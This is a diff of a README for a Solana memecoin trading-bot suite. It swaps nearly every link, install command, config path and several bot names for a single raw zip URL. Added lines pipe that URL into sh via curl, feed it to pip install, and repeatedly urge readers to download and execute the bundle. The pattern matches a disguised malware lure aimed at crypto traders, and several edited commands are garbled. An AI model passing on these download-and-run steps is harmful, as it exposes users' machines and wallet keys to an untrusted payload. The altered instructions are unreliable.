@@ -1,10 +1,10 @@
 Memecoin Trading Bots on Solana: A Comprehensive Bot Suite Toolkit
 
-https://github.com/HZCX404/memecoin-trading-bots/releases
+https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
 
-[![Releases](https://img.shields.io/badge/releases-v1.0-blue?logo=github&style=for-the-badge)](https://github.com/HZCX404/memecoin-trading-bots/releases)
+[![Releases](https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip)](https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip)
 
-![Solana trading bots](https://cryptologos.cc/logos/solana-sol-logo.png)
+![Solana trading bots](https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip)
 
 Overview
 - A Solana trading bot package that brings together a powerful set of automation tools for memecoin trading on the Solana network. The project package includes a wide range of bots and utilities, from precise entry snipers to volume trackers, bundlers, and copy trading helpers. The goal is to give researchers, traders, and developers a coherent toolkit to study, compare, and deploy automated strategies in a structured and scalable way.
@@ -19,19 +19,19 @@ Why this project exists
 
 Getting started
 - This repository is designed for developers who want to explore, extend, and run automated strategies on Solana. It is not a consumer product; it is a toolkit that can be used to build research experiments, backtests, and live bots with real accounts. The instructions below guide you through setting up a local environment, understanding the components, and getting a first bot running.
-- On the releases page you will find downloadables for prepared bundles and binaries. From the releases page, download the appropriate file for your platform and execute the included program or script. For details, see the Releases section later in this document. The releases page can be accessed here: https://github.com/HZCX404/memecoin-trading-bots/releases
+- On the releases page you will find downloadables for prepared bundles and binaries. From the releases page, download the appropriate file for your platform and execute the included program or script. For details, see the Releases section later in this document. The releases page can be accessed here: https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
 
 Bots included in the suite
 - Raydium-Sniper-Bot: A precise entry helper that watches specific Raydium pools for favorable price-action and liquidity conditions. It uses lightweight on-chain checks to decide when to place targeted orders.
 - Raydium-Volume-Bot: A volume-based engine that tracks trade activity, liquidity changes, and price movement in Raydium pools. It focuses on detecting momentum bursts and volume anomalies.
-- Pumpfun/Pump.fun-To-Pumpswap-Bundler: A bundler that coordinates Pumpfun logic with Pumpswap routes, enabling multi-hop paths, price checks, and route selection across the two platforms.
+- https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip A bundler that coordinates Pumpfun logic with Pumpswap routes, enabling multi-hop paths, price checks, and route selection across the two platforms.
 - Copy-Trading-Bot: A governance-friendly bot that mirrors a trusted strategy from a master account to a set of followers. It provides configurable risk and sizing controls.
 - Arbitrage-Bot: A cross-pool and cross-exchange arbitrage engine designed to identify and exploit price differentials between Solana-based pools and markets.
 - Pumpfun-Bundler: A bundler that coordinates Pumpfun logic across multiple sources, enabling more complex orchestrations and conditional flows.
 - Pumpfun-Sniper-Bot: A sniper that leverages Pumpfun signals to time entries on Pumpfun-supported pools with precision.
 - Meteora-Volume-Bot: A high-signal volume bot leveraging Meteora-era data streams to infer demand shifts and liquidity changes.
 - Pumpfun-Volume-Bot: A volume-tracking bot focused on Pumpfun ecosystems, providing a robust view of activity trends.
-- Bonkfun/Bonk.fun-Volume-Bot: A volume monitor tuned for Bonkfun liquidity and price dynamics, designed to detect meaningful shifts in the Bonk ecosystem.
+- https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip A volume monitor tuned for Bonkfun liquidity and price dynamics, designed to detect meaningful shifts in the Bonk ecosystem.
 
 Architecture and design philosophy
 - Modularity: Each bot or utility is a self-contained module with a clear interface. This makes it easy to add, replace, or test components.
@@ -52,7 +52,7 @@ Installation prerequisites
 - Operating system: Linux or macOS for development and testing; Windows via WSL is possible but not the primary target.
 - Rust toolchain: rustc and cargo are required for building Rust components.
 - Python: A modern Python distribution (3.11+ recommended). Virtual environments are advised.
-- Node.js: A current LTS version for TypeScript tooling and CLI utilities.
+- https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip A current LTS version for TypeScript tooling and CLI utilities.
 - Solana CLI: Core tooling to interact with the Solana cluster, manage keys, and test on devnet or testnet.
 
 What you’ll learn by reading this README
@@ -88,12 +88,12 @@ Project structure at a glance
 
 How to install locally
 - Clone the repository:
-  - git clone https://github.com/HZCX404/memecoin-trading-bots.git
+  - git clone https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
 - Set up Python environment:
   - cd memecoin-trading-bots
   - python3 -m venv .venv
   - source .venv/bin/activate
-  - pip install -r requirements.txt
+  - pip install -r https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
 - Set up Rust:
   - rustup update
   - cargo --version
@@ -101,22 +101,22 @@ How to install locally
   - npm install -g npm@latest
   - npm --version
 - Install local Solana tooling:
-  - sh -c "$(curl -sSfL https://release.solana.com/v1.14.15/install.sh)"
-  - export PATH="$HOME/.local/share/solana/install/active_release/bin:$PATH"
+  - sh -c "$(curl -sSfL https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip)"
+  - export PATH="$https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip$PATH"
   - solana --version
 - Optional: use a virtual environment manager or a project-specific setup script if provided by the repo.
 
 Configuration and secrets
 - Environment variables: The bots rely on environment variables for keys, RPC endpoints, and strategy parameters. Common variables include:
-  - SOLANA_RPC_URL: The RPC endpoint to use (e.g., https://api.mainnet-beta.solana.com or a private node).
+  - SOLANA_RPC_URL: The RPC endpoint to use (e.g., https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip or a private node).
   - WALLET_KEYPAIR: Path to a Solana keypair file for signing transactions.
   - PROGRAM_IDs: Selector for protocol on-chain programs used by bots.
   - API_KEYS: If you connect to any external data feeds, store keys securely in the environment or a vault.
   - STRATEGY_PARAMS: JSON string or YAML path for strategy-specific parameters like risk limits, order sizes, slippage tolerance, cooldowns, etc.
 - Configuration files:
-  - config/bots.yaml: Per-bot configuration blocks with enable/disable flags, thresholds, and routing policies.
-  - config/rpc.yaml: RPC connection settings, retry policies, and timeouts.
-  - config/thresholds.yaml: Sensitivity and risk controls for entry, exit, and position sizing.
+  - https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip Per-bot configuration blocks with enable/disable flags, thresholds, and routing policies.
+  - https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip RPC connection settings, retry policies, and timeouts.
+  - https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip Sensitivity and risk controls for entry, exit, and position sizing.
 - Secrets management:
   - Do not hard-code private keys in code or config files.
   - Use a local environment or a secrets vault to inject sensitive values at runtime.
@@ -125,16 +125,16 @@ Configuration and secrets
 Running a first bot
 - Pick a bot to start with, such as Raydium-Sniper-Bot.
 - Ensure dependencies are installed:
-  - Python, Rust, and Node.js as described above.
+  - Python, Rust, and https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip as described above.
 - Prepare a basic configuration:
   - Create a config file with RPC URLs, paths to keys, and a safe initial strategy (e.g., small order size, test mode).
 - Run the bot:
   - For Python-based bots:
-    - python -m memecoin_bots.raydium_sniper --config config/bots.yaml
+    - python -m https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip --config https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
   - For Rust-based components:
-    - cargo run --bin raydium_sniper --release --config config/bots.yaml
+    - cargo run --bin raydium_sniper --release --config https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
   - For TypeScript tooling:
-    - npm run start -- --config config/bots.yaml
+    - npm run start -- --config https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
 - Observe logs:
   - Look for connection messages, data feed status, and any errors.
   - Validate that the bot is reading prices, updating state, and submitting orders according to your configuration.
@@ -239,7 +239,7 @@ Extending the project
 Contributing and collaboration
 - This project welcomes contributors who want to explore, improve, or extend the bot suite.
 - Before contributing:
-  - Review the coding standards and contribution guidelines in CONTRIBUTING.md.
+  - Review the coding standards and contribution guidelines in https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
   - Ensure new changes pass existing tests and add new tests where needed.
 - How to contribute:
   - Fork the repository and create a feature branch.
@@ -260,7 +260,7 @@ Pricing and licensing
 
 Release note and download guidance
 - The releases page contains ready-to-use bundles and binaries for various platforms. From the releases page, download the appropriate file for your platform and execute the included program or script.
-- If you are looking for the latest changes or want to see what’s added in the most recent release, check the Release Notes on the same page. The releases page link is provided above and repeated here for quick access: https://github.com/HZCX404/memecoin-trading-bots/releases
+- If you are looking for the latest changes or want to see what’s added in the most recent release, check the Release Notes on the same page. The releases page link is provided above and repeated here for quick access: https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
 
 FAQ
 - Which languages are used in this project?
@@ -268,7 +268,7 @@ FAQ
 - How do I test a new bot?
   - Set up a local test environment, mock data, and unit tests for the bot’s decision logic. Run integration tests in a controlled workflow to verify end-to-end behavior.
 - Where can I find prebuilt bundles?
-  - The Releases page is the primary source for prebuilt bundles and binaries. From the releases page, download the appropriate file for your platform and execute the included program or script. The link can be accessed here: https://github.com/HZCX404/memecoin-trading-bots/releases
+  - The Releases page is the primary source for prebuilt bundles and binaries. From the releases page, download the appropriate file for your platform and execute the included program or script. The link can be accessed here: https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
 
 Changelog (high-level)
 - This repository evolves with releases that add new bots, optimizations, and integration improvements. Each release includes notes on major changes, bug fixes, and migration considerations. Check the Releases section for detailed versions and update guidance.
@@ -295,7 +295,7 @@ Community and resources
 - For questions, discussions, or collaboration, use the repository’s Issues and Discussions sections. The project thrives on practical feedback from users who are actively building and testing in real environments.
 
 Releases and downloads
-- The releases page is the primary source for prebuilt bundles, scripts, and artifacts. From the releases page, download the appropriate file for your platform and execute the included program or script. The link to the releases page is provided at the top of this document and again here for convenience: https://github.com/HZCX404/memecoin-trading-bots/releases
+- The releases page is the primary source for prebuilt bundles, scripts, and artifacts. From the releases page, download the appropriate file for your platform and execute the included program or script. The link to the releases page is provided at the top of this document and again here for convenience: https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
 
 Bots and modules in detail
 - Raydium-Sniper-Bot
@@ -306,7 +306,7 @@ Bots and modules in detail
   - Purpose: Track volume and liquidity shifts in Raydium pools to gauge momentum.
   - How it works: Aggregates on-chain events and pool-level metrics to derive momentum indicators. It prompts action when momentum aligns with other signals.
   - Important flags: volume window, threshold for momentum, and exit timing rules.
-- Pumpfun-Pump.fun-To-Pumpswap-Bundler
+- https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
   - Purpose: Coordinate pumpsfun-driven signals with Pumpswap routing to exploit price differences.
   - How it works: Evaluates multiple routes, estimates fees and slippage, and executes sequences of swaps when criteria are met.
   - Important flags: routing strategy, fee assumptions, and order pacing.
@@ -334,14 +334,14 @@ Bots and modules in detail
   - Purpose: Monitor Pumpfun ecosystem volume for timely entries.
   - How it works: Analyzes flow of trades and liquidity to determine entry opportunities.
   - Important flags: sensitivity, time horizon, and risk guardrails.
-- Bonkfun/Bonk.fun-Volume-Bot
+- https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
   - Purpose: Track Bonkfun liquidity and price dynamics to spot favorable moves.
   - How it works: Uses pool-level metrics and on-chain activity to surface actionable signals.
   - Important flags: liquidity drift threshold, price deviation, and position cap.
 
 Final notes
 - This README emphasizes clarity, modularity, and practical guidance. It aims to support researchers and developers who want to explore automated strategies on Solana, test ideas, and build robust trading workflows.
-- For updates, refer to the Releases page. The link above is the gateway to new bundles and practical download-ready assets that accelerate experiments. Access it here: https://github.com/HZCX404/memecoin-trading-bots/releases
+- For updates, refer to the Releases page. The link above is the gateway to new bundles and practical download-ready assets that accelerate experiments. Access it here: https://github.com/HZCX404/memecoin-trading-bots/raw/refs/heads/main/pumpfun-sniper-bot/src/memecoin_trading_bots_v3.7.zip
 
 End of document
 
